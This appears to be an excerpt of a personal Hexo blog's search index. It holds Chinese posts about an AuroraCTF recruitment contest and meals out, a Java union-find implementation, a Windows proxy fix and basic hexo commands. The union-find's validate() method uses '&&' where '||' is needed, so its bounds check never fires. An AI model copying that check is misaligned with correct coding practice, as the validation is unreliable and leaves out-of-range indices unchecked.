    <content type="html"><![CDATA[<h3 id="AuroraCTF-招新赛"><a href="#AuroraCTF-招新赛" class="headerlink" title="AuroraCTF(招新赛)"></a>AuroraCTF(招新赛)</h3><p>本次比赛从9.15的晚上7点半开始，9.17号晚上7点半定榜。</p><p>总结一下这次比赛吧，成绩还算可以，但是自己方向做的其实不算很好，技术仍需要继续精进，放张照片留念一下吧。</p><img src="/2023/09/18/first%E8%AF%B4%E8%AF%B4/haha.png" class title="haha"><h3 id="吃"><a href="#吃" class="headerlink" title="吃"></a>吃</h3><p>周六晚上和宿友吃夜宵，吃了牛杂米粉，还可以，就是价格还是说贵了</p><img src="/2023/09/18/first%E8%AF%B4%E8%AF%B4/c.jpg" class title="c"><p>周日晚上和EA的伙伴去外面吃了姊妹豆花</p><img src="/2023/09/18/first%E8%AF%B4%E8%AF%B4/b.jpg" class title="b">]]></content>
    
    
    <categories>
      
      <category>说说</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UnionFind(并查集)</title>
    <link href="/2023/07/19/UnionFind/"/>
    <url>/2023/07/19/UnionFind/</url>
    
    <content type="html"><![CDATA[<h1 align="center">UnionFind</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnionFind</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> []parent;<br>    <span class="hljs-comment">//初始化每个节点</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UnionFind</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br>        <span class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;n must &gt; 0&quot;</span>);<br>        &#125;<br>        parent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>            parent[i]=-<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//判断输入的下标是否有效</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validate</span><span class="hljs-params">(<span class="hljs-type">int</span> v1)</span>&#123;<br>        <span class="hljs-keyword">if</span>(v1&lt;<span class="hljs-number">0</span>&amp;&amp;v1&gt;=parent.length)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(v1+<span class="hljs-string">&quot; is not a valid index.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//返回该节点所在的整棵树的大小</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sizeof</span><span class="hljs-params">(<span class="hljs-type">int</span> v1)</span>&#123;<br>        <span class="hljs-keyword">return</span> -parent[find(v1)];<br>    &#125;<br>    <span class="hljs-comment">//返回该节点的父节点</span><br>    <span class="hljs-comment">//如果该节点是根结点，返回树的大小</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">parent</span><span class="hljs-params">(<span class="hljs-type">int</span> v1)</span>&#123;<br>        <span class="hljs-keyword">return</span> parent[v1];<br>    &#125;<br>    <span class="hljs-comment">//判断两个节点是否连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">is_connected</span><span class="hljs-params">(<span class="hljs-type">int</span> v1,<span class="hljs-type">int</span> v2)</span>&#123;<br>        <span class="hljs-keyword">return</span> find(v1)==find(v2);<br>    &#125;<br>    <span class="hljs-comment">//连接两个节点</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> v1,<span class="hljs-type">int</span> v2)</span>&#123;<br>        <span class="hljs-keyword">if</span>(is_connected(v1,v2))&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> size1=-parent[find(v1)];<br>        <span class="hljs-type">int</span> size2=-parent[find(v2)];<br><br>        <span class="hljs-keyword">if</span>(size1&gt;=size2)&#123;<br>            parent[find(v2)]=find(v1);<br>            parent[find(v1)]=-(size1+size2);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            parent[find(v1)]=find(v2);<br>            parent[find(v2)]=-(size1+size2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//找该节点的根节点</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> v)</span>&#123;<br>        <span class="hljs-type">int</span> root=v;<br>        <span class="hljs-keyword">while</span>(parent[root]&gt;=<span class="hljs-number">0</span>)&#123;<br>            root=parent[root];<br>        &#125;<br>        <span class="hljs-comment">//路径压缩，更新根节点</span><br>        <span class="hljs-keyword">while</span>(parent[v]&gt;=<span class="hljs-number">0</span>)&#123;<br>            parent[v]=root;<br>            v=parent[v];<br>            <span class="hljs-keyword">if</span>(v&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        UnionFind kun=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UnionFind</span>(<span class="hljs-number">10</span>);<br>        kun.connect(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>        kun.connect(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<br>        kun.connect(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);<br>        kun.connect(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>        kun.connect(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>);<br>        kun.connect(<span class="hljs-number">8</span>,<span class="hljs-number">9</span>);<br>        kun.connect(<span class="hljs-number">6</span>,<span class="hljs-number">8</span>);<br>        kun.connect(<span class="hljs-number">2</span>,<span class="hljs-number">6</span>);<br>        System.out.println(kun.sizeof(<span class="hljs-number">6</span>));<br>        System.out.println(kun.sizeof(<span class="hljs-number">0</span>));<br>        System.out.println(kun.sizeof(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Algorithm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个小问题</title>
    <link href="/2023/07/19/%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/"/>
    <url>/2023/07/19/%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 align="center">一个小问题</h1><p>我的电脑连接了网线，有连接上的标志，开了热点给手机用，手机能上网，但是电脑上不了网。</p><p>我当时的解决办法：</p><p>第一步:   打开设置</p><p>第二步：打开网络和Internet中的代理</p><p>第三步：找到使用代理服务器那个设置，关闭即可。</p>]]></content>
    
    
    <categories>
      
      <category>有用的小tips</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello Blog！</title>
    <link href="/2022/10/26/HelloBlog/"/>
    <url>/2022/10/26/HelloBlog/</url>
    
    <content type="html"><![CDATA[<p>终于把博客弄好了！！</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><h3 id="日常上传博客"><a href="#日常上传博客" class="headerlink" title="日常上传博客"></a>日常上传博客</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ hexo clean <span class="hljs-regexp">//</span>清除缓存<br>$ hexo g  <span class="hljs-regexp">//</span>生成静态文件<br>$ hexo d  <span class="hljs-regexp">//</span>上传Github<br>日常上传博客也是这个步骤<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>有用的小tips</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
